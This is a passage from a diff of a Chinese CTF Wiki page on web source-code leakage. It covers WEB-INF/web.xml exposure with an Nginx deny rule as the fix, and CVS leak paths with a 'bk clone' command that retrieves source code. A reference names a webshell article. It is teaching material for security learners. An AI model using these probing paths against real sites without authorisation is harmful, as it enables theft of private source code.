 </code></pre></div> <p><a href=http://tools.40huo.cn/#!web.md#源码泄露>Seay - SVN</a></p> <h3 id=web-inf-webxml>WEB-INF / web.xml 泄露<a class=headerlink href=#web-inf-webxml title="Permanent link">&para;</a></h3> <p>WEB-INF 是 Java Web 应用的安全目录，web.xml 中有文件的映射关系。</p> <p>WEB-INF 主要包含以下文件或目录：</p> <ul> <li><code>/WEB-INF/web.xml</code> ：Web 应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</li> <li><code>/WEB-INF/classes/</code> ：包含站点所有用到的 class 文件，包括 servlet class 和非 servlet class，他们不能包含在 jar 文件中。</li> <li><code>/WEB-INF/lib/</code> ：存放 web 应用需要的各种 JAR 文件，放置仅在这个应用中要求使用的 jar 文件，如数据库驱动 jar 文件。</li> <li><code>/WEB-INF/src/</code> ：源码目录，按照包名结构放置各个 java 文件。</li> <li><code>/WEB-INF/database.properties</code> ：数据库配置文件。</li> </ul> <p>通过找到 web.xml 文件，推断 class 文件的路径，最后直接 class 文件，再通过反编译 class 文件，得到网站源码。 一般情况，jsp 引擎默认都是禁止访问 WEB-INF 目录的，Nginx 配合 Tomcat 做均衡负载或集群等情况时，问题原因其实很简单，Nginx 不会去考虑配置其他类型引擎（Nginx 不是 jsp 引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改 Nginx 配置文件禁止访问 WEB-INF 目录就好了：</p> <div class=highlight><pre><span></span><code><span class=k>location</span><span class=w> </span><span class=p>~</span><span class=w> </span><span class=sr>^/WEB-INF/*</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=kn>deny</span><span class=w> </span><span class=s>all</span><span class=p>;</span><span class=w> </span><span class=p>}</span><span class=w> </span><span class=c1># 或者return 404; 或者其他！</span>
 </code></pre></div> <h3 id=cvs>CVS 泄露<a class=headerlink href=#cvs title="Permanent link">&para;</a></h3> <div class=highlight><pre><span></span><code>http://url/CVS/Root 返回根信息
 http://url/CVS/Entries 返回所有文件的结构
-</code></pre></div> <p>取回源码</p> <div class=highlight><pre><span></span><code>bk clone http://url/name dir
-</code></pre></div> <h3 id=_21>参考文献<a class=headerlink href=#_21 title="Permanent link">&para;</a></h3> <ul> <li><a href=https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html>记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></li> </ul> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../../ssrf/ class="md-footer__link md-footer__link--prev" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> SSRF </div> </div> </a> <a href=../../../assembly/x86-x64/readme/ class="md-footer__link md-footer__link--next" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> x86_x64 </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2016 - 2022 CTF Wiki Team </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs Insiders </a> </div> </div> </div> </footer> </div> <script src=../../../assets/javascripts/vendor.191088e8.min.js></script> <script src=../../../assets/javascripts/bundle.d4cf0930.min.js></script><script id=__lang type=application/json>{"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "Missing"}</script> <script>
+</code></pre></div> <p>取回源码</p> <div class=highlight><pre><span></span><code>bk<span class=w> </span>clone<span class=w> </span>http://url/name<span class=w> </span>dir
+</code></pre></div> <h3 id=_21>参考文献<a class=headerlink href=#_21 title="Permanent link">&para;</a></h3> <ul> <li><a href=https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html>记一次拿webshell踩过的坑(如何用PHP编写一个不包含数字和字母的后门)</a></li> </ul> </article> </div> </div> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../../ssrf/ class="md-footer__link md-footer__link--prev" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> SSRF </div> </div> </a> <a href=../../../assembly/x86-x64/readme/ class="md-footer__link md-footer__link--next" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> x86_x64 </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-footer-copyright> <div class=md-footer-copyright__highlight> Copyright &copy; 2016 - 2023 CTF Wiki Team </div> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs Insiders </a> </div> </div> </div> </footer> </div> <script src=../../../assets/javascripts/vendor.191088e8.min.js></script> <script src=../../../assets/javascripts/bundle.d4cf0930.min.js></script><script id=__lang type=application/json>{"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "Missing"}</script> <script>
         app = initialize({
           base: "../../..",
           features: ["navigation.tabs", "navigation.tabs.sticky", "search.suggest", "search.highlight", "search.share"],
